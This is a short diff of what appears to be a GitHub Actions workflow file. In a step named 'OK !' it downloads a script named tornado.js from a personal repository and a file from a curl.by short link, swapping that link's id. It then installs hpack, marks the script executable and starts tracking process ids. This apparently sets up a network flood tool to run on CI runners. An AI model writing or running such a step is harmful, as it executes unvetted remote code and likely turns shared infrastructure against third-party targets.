@@ -18,7 +18,7 @@ jobs:
       - name: OK !
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
-          wget https://curl.by/ILl73/fres.txt
+          wget https://curl.by/31E1Z/fres.txt
           npm i hpack
           chmod +x tornado.js
           PIDS=()
